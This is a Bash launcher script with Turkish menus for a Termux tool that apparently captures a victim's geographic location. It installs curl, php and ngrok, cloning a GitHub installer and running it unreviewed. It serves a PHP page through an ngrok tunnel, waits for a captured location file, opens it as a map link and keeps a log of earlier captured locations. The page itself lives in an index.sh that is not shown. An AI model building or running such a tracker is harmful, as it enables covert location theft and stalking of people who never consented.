#!/bin/bash
# CURL  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/curl ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi

# PHP  PAKET KONTROLÜ #

if [[ ! -a $PREFIX/bin/php ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ KURULUYOR"
	echo
	echo
	echo
	pkg install php -y
fi

# NGROK KONTROLÜ #

if [[ ! -a $PREFIX/bin/ngrok ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termuxxtoolss/ngrok-kurulum
	cd ngrok-kurulum
	bash ngrok-kurulum.sh
	cd ..
	rm -rf ngrok-kurulum
fi

if [[ $1 == update ]];then
	cd files
	./update.sh update
	exit
fi

# BİLDİRİM SCRİPT KONTROLÜ #

if [[ -a files/termuxxtoolssmod ]];then
	mv files/termuxxtoolssmod $PREFIX/bin
	chmod 777 $PREFIX/bin/*
fi
control=$(ps aux | grep "ngrok" | grep -v grep |grep -o ngrok)
if [[ -n $control ]];then
	killall ngrok
	killall php
fi
clear
cd files
./update.sh
bash banner.sh
cd ..
if [[ -a updates_infos ]];then
	rm updates_infos
	exit
fi
cd files
#################### BULUNAN KONUM ADRESİ ####################
bulunan () {
if [[ -e "eskikonum.txt" ]]; then
	kontrol=$(cat eskikonum.txt |wc -w)
	if [[ $kontrol -gt 0 ]];then
		echo
		printf "\e[32m [✓] \e[97mBULUNAN KONUM ADRESİ \e[31m>> \e[0m "
		satir=$(cat eskikonum.txt |wc -w)
		sed -n $satir\p eskikonum.txt
	fi
fi
}

#################### URL BULMA DÖNGÜSÜ ####################

url() {
	while true;
	do
		if [[ -e "konum.txt" ]]; then
			echo "[✓] KONUM ALINDI" > .info
			termuxxtoolssmod --send
			link=$(cat konum.txt)
			xdg-open $link
			rm konum.txt
			kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
			if [[ $kontrol == ngrok ]];then
				killall ngrok
				killall php
			fi
			break


		fi
	done


}

#################### MENÜ ###################

function finish() {
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
	if [[ $kontrol == ngrok ]];then
		killall ngrok
		killall php
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
bulunan
printf "

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mBAŞLAT\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mBULUNAN ESKİ KONUMLAR\e[97m

\e[31m[\e[97mA\e[31m]\e[97m ────────── \e[33mBİLDİRİM AYARLARI\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[0m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [ $secim == 1 ];then
	kontrol=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
	if [[ $kontrol == 0 ]];then
		bash index.sh -bg -p 4444
		echo
		echo
		echo
		sleep 3
		printf "\e[33m[*]\e[97m KONUM BULUNDUĞUNDA BİLDİRİM İLE HABER VERİLECEK.."
		echo
		echo
		echo
		echo
		sleep 2
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		url
		cd ..
		bash $0
	fi
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
	echo
	echo
	echo
	exit
elif [[ $secim == A || $secim == a ]];then
	termuxxtoolssmod --settings
	sleep 1
	cd ..
	bash $0
	exit
elif [ $secim == 2 ];then
	if [[ -a eskikonum.txt ]];then
		kontrol=$(cat eskikonum.txt |wc -w)
		if [[ $kontrol -gt 0 ]];then
			echo
			echo
			echo
			printf "\e[32m$(cat eskikonum.txt)\e[97m"
			echo
			echo
			echo
			printf "\e[33mESKİ KONUMLAR SİLİNSİN Mİ ? \e[97m[ \e[32mE\e[97m / \e[31mH\e[97m ]"
			echo
			echo
			read -e -p $'\e[97m SEÇENEK GİRİNİZ \e[31m>>\e[97m ' sil
			if [[ $sil == e || $sil == E ]];then
				rm eskikonum.txt
				touch eskikonum.txt
				echo
				echo
				echo
				printf "\e[32m[✓]\e[97m ESKİ KONUMLAR SİLİNDİ"
				echo
				echo
				echo
				cd ..
				sleep 2
				bash $0
			elif [[ $sil == h || $sil == H ]];then
				echo
				echo
				echo
				printf "\e[33m[*]\e[97m ESKİ KONUM SİLME İPTAL EDİLDİ"
				echo
				echo
				echo
				cd ..
				sleep 2
				bash $0
			else
				echo
				echo
				echo
				printf "\e[32m[!]\e[97m HATALI SEÇİM \e[31m!!!\e[97m"
				echo
				echo
				echo
				echo
				cd ..
				sleep 2
				bash $0
			fi
		else
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m KAYITLI ESKİ KONUM BULUNAMADI"
			echo
			echo
			echo
			cd ..
			sleep 2
			bash $0
			


		fi

	fi
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM \e[31m!!!\e[0m"
	echo
	echo
	echo
	cd ..
	sleep 2
	bash $0
fi
